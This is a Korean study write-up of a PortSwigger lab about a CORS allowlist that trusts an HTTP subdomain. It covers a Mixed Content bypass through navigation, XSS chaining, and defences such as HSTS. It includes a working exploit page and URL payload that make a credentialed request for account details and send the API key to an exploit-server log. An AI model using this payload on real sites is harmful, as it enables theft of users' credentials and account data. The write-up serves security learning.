# Lab: CORS vulnerability with trusted insecure protocols

## 개요

- **난이도**: Practitioner
- **주제**: CORS — 신뢰된 서브도메인 + HTTP 프로토콜 / XSS 연계 / Mixed Content 우회
- **링크**: https://portswigger.net/web-security/cors/lab-breaking-https-attack

## 목표

메인 사이트(HTTPS)가 CORS 허용 출처로 `http://stock.VULNERABLE.com` (HTTP 서브도메인)을 신뢰한다. 해당 서브도메인의 쿼리 파라미터에 XSS 취약점이 존재하므로, XSS 로 피해자의 브라우저에서 CORS 요청을 실행해 API 키를 탈취한다. Mixed Content 차단 우회가 핵심이다.

## 002 랩들과의 차이

```
[001 — Origin 무조건 반영]
  서버가 어떤 Origin 이든 허용

[002 — null 화이트리스트]
  null 을 신뢰 → sandboxed iframe 으로 공격

[003 (이번) — 신뢰된 서브도메인 + HTTP]
  구체적인 서브도메인을 신뢰하지만
  해당 서브도메인이 HTTP (비보안) 프로토콜
  → 서브도메인의 XSS 로 신뢰된 출처에서 요청 발생
  → HTTPS 사이트 데이터를 HTTP 경유로 탈취
```

## 취약점 구조

### 서버 CORS 설정

```
메인 사이트: https://VULNERABLE.com
신뢰 출처:   http://stock.VULNERABLE.com   ← HTTP (비보안!)

요청:
  GET /accountDetails HTTP/1.1
  Origin: http://stock.VULNERABLE.com
  Cookie: session=abc123

응답:
  Access-Control-Allow-Origin: http://stock.VULNERABLE.com
  Access-Control-Allow-Credentials: true
  → 인증된 응답 반환
```

### 서브도메인 XSS

```
http://stock.VULNERABLE.com/?productId=<XSS>&storeId=1

productId 파라미터가 HTML 에 반영될 때 인코딩 없음
→ 임의 JS 실행 가능

XSS 실행 컨텍스트:
  Origin: http://stock.VULNERABLE.com
  → 이 출처는 메인 사이트의 CORS 화이트리스트에 있음!
  → 여기서 실행된 JS 는 메인 사이트 API 를 자격증명 포함 호출 가능
```

## Mixed Content 문제와 우회

### Mixed Content 란

```
HTTPS 페이지에서 HTTP 리소스를 로드하는 것

[Passive Mixed Content — 경고만]
  이미지, 동영상 등
  → 브라우저가 경고하지만 허용

[Active Mixed Content — 차단]
  Script, XHR/fetch, iframe, CSS 등
  → 브라우저가 완전 차단

예:
  https://exploit.com 의 JS 에서
  fetch('http://stock.VULNERABLE.com/...') → 차단!
  new XMLHttpRequest().open('GET', 'http://...') → 차단!
```

### 우회: 페이지 탐색(Navigation)

```
Mixed Content 규칙이 적용되지 않는 경우:

document.location = 'http://...'
  → 탐색(Navigation) 은 Mixed Content 로 취급하지 않음
  → HTTPS 페이지에서 HTTP 페이지로 이동 가능!

차이:
  fetch('http://...')     → 서브리소스 요청 → 차단
  document.location = 'http://...'  → 탐색 → 허용

공격 활용:
  1. HTTPS exploit 페이지에서 document.location 으로 HTTP 서브도메인으로 이동
  2. HTTP 서브도메인에서 XSS 실행 (HTTP 컨텍스트이므로 Mixed Content 없음)
  3. XSS 가 HTTPS 메인 사이트로 credentialed 요청 (HTTP→HTTPS 는 허용)
```

## 공격 방법

### 전체 공격 흐름

```
[HTTPS exploit 서버]
  ↓ document.location 탐색 (Mixed Content 우회)
[HTTP stock 서브도메인 — XSS 실행]
  ↓ XHR with credentials (HTTP→HTTPS 는 Mixed Content 아님)
[HTTPS 메인 사이트 — API 응답 반환]
  ↓ 응답(API 키)을 exploit 서버로 전송
[HTTPS exploit 서버 로그]
```

### exploit 페이지 코드

```html
<script>
document.location = "http://stock.VULNERABLE.com/?productId="
    + "<script>"
    + "var req = new XMLHttpRequest();"
    + "req.onload = function() {"
    + "  location = 'https://exploit-server.net/log?key=' + encodeURIComponent(this.responseText);"
    + "};"
    + "req.open('GET', 'https://VULNERABLE.com/accountDetails', true);"
    + "req.withCredentials = true;"
    + "req.send();"
    + "</scr" + "ipt>"
    + "&storeId=1";
</script>
```

URL 인코딩 포함 실제 payload:

```
http://stock.VULNERABLE.com/?productId=<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    location = 'https://exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
  };
  req.open('GET', 'https://VULNERABLE.com/accountDetails', true);
  req.withCredentials = true;
  req.send();
</script>&storeId=1
```

### 단계별 실행 흐름

```
1. 피해자: HTTPS exploit 페이지 방문

2. exploit 페이지:
   document.location = 'http://stock.VULNERABLE.com/?productId=<XSS>&storeId=1'
   → 탐색이므로 Mixed Content 차단 없음
   → 피해자 브라우저가 HTTP 서브도메인으로 이동

3. stock.VULNERABLE.com:
   productId 파라미터가 HTML 에 그대로 반영
   → <script>...</script> 실행
   → 실행 컨텍스트 Origin: http://stock.VULNERABLE.com

4. XSS 스크립트:
   XHR 전송:
     GET https://VULNERABLE.com/accountDetails
     Origin: http://stock.VULNERABLE.com   ← 신뢰된 출처
     Cookie: session=<피해자 세션>         ← withCredentials

5. VULNERABLE.com 서버:
   Origin 확인 → 화이트리스트에 있음
   Access-Control-Allow-Origin: http://stock.VULNERABLE.com
   Access-Control-Allow-Credentials: true
   Body: {"apiKey":"secret123"}

6. XSS 스크립트:
   응답 수신 → exploit 서버로 전송:
   location = 'https://exploit-server.net/log?key=...'

7. exploit 서버 로그에서 API 키 확인
```

## Mixed Content 차단 우회 요약

```
HTTPS 페이지에서 HTTP 로:

차단됨:
  fetch('http://...')
  new XMLHttpRequest(); req.open('GET', 'http://...')
  <img src="http://..."> (일부 브라우저)
  <script src="http://...">

허용됨:
  document.location = 'http://...'     ← 이번 랩 활용
  window.location.href = 'http://...'
  <a href="http://..."> 클릭
  form action="http://..." submit

이유:
  리소스 로드(fetch/XHR/script 태그) = 서브리소스 → Mixed Content 규칙 적용
  페이지 탐색(location 변경) = Navigation → Mixed Content 규칙 미적용
  단, 최신 Chrome 은 HTTPS→HTTP 자동 업그레이드 시도 (HTTPS Everywhere)
```

## 핵심 정리

- CORS 화이트리스트에 HTTP 서브도메인을 신뢰하면, 해당 서브도메인의 XSS 를 통해 HTTPS 사이트의 인증 데이터를 탈취할 수 있다.
- `document.location` 탐색은 Mixed Content 로 취급되지 않아 HTTPS 페이지에서 HTTP 페이지로 이동 가능하다.
- XSS 가 실행되는 컨텍스트의 Origin 이 CORS 화이트리스트에 있으면, 그 XSS 가 credentialed CORS 요청을 수행할 수 있다.
- **방어**:
  - CORS 화이트리스트에 HTTP 출처 포함 금지 (반드시 HTTPS 만)
  - 서브도메인의 XSS 도 메인 도메인 보안에 영향을 줌 → 서브도메인 XSS 방어 필수
  - `Strict-Transport-Security` (HSTS) 로 서브도메인까지 HTTPS 강제

## 배운 점 및 추가 학습

### 1. CORS 와 프로토콜 — 출처의 정확한 의미

```
출처(Origin) = 프로토콜 + 호스트 + 포트

https://example.com  ≠  http://example.com
  → 프로토콜이 다르면 다른 출처

CORS 화이트리스트에서:
  'https://stock.example.com' → HTTPS 만 허용
  'http://stock.example.com'  → HTTP 도 허용 (위험!)

서버 설정 실수:
  const allowed = ['http://stock.example.com'];  // HTTP 포함 → 취약
  const allowed = ['https://stock.example.com']; // HTTPS 만 → 안전
```

### 2. 서브도메인 XSS 와 메인 도메인 보안의 연관성

```
서브도메인이 위험한 이유:

[쿠키 공유]
  .example.com 도메인 쿠키는 서브도메인에도 전송
  → sub.example.com 의 XSS 가 세션 쿠키 탈취 가능

[CORS 화이트리스트 악용 (이번 랩)]
  메인 사이트가 서브도메인을 신뢰
  → 서브도메인 XSS → 신뢰된 출처에서 API 호출

[SameSite 쿠키 관점]
  SameSite=Strict/Lax 는 서브도메인을 같은 사이트로 처리
  → 서브도메인에서의 요청에 메인 쿠키 포함

결론:
  메인 도메인 보안 = 모든 서브도메인의 보안
  서브도메인 하나라도 XSS 있으면 전체 보안 약화
```

### 3. HSTS(HTTP Strict Transport Security)

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

max-age: HSTS 적용 기간 (초)
includeSubDomains: 서브도메인에도 HTTPS 강제
preload: 브라우저 내장 HSTS 목록에 등록

효과:
  http://stock.example.com 접근 시
  → 브라우저가 자동으로 https://stock.example.com 으로 변경
  → HTTP 서브도메인으로의 이동 자체를 차단

이번 랩 방어에 적용:
  includeSubDomains 설정 시
  document.location = 'http://stock.VULNERABLE.com/...' 가
  자동으로 https://... 로 업그레이드
  → XSS 가 실행되는 컨텍스트가 HTTPS
  → 하지만 XSS 자체는 여전히 위험 (CORS 신뢰 문제 미해결)
  → 근본 해결은 CORS 화이트리스트에서 HTTP 출처 제거
```

### 4. 003 랩까지 CORS 취약점 패턴 비교

| 항목 | 001 | 002 | 003 (이번) |
|------|-----|-----|-----------|
| 서버 설정 문제 | Origin 무조건 반영 | null 신뢰 | HTTP 서브도메인 신뢰 |
| 공격 기법 | 직접 fetch | sandboxed iframe | XSS + 탐색 우회 |
| Mixed Content | 없음 | 없음 | `document.location` 으로 우회 |
| XSS 필요 | 없음 | 없음 | 필요 (서브도메인) |
| 난이도 | Apprentice | Apprentice | Practitioner |
| 핵심 우회 | — | sandbox null | HTTP→HTTPS 신뢰 체인 |
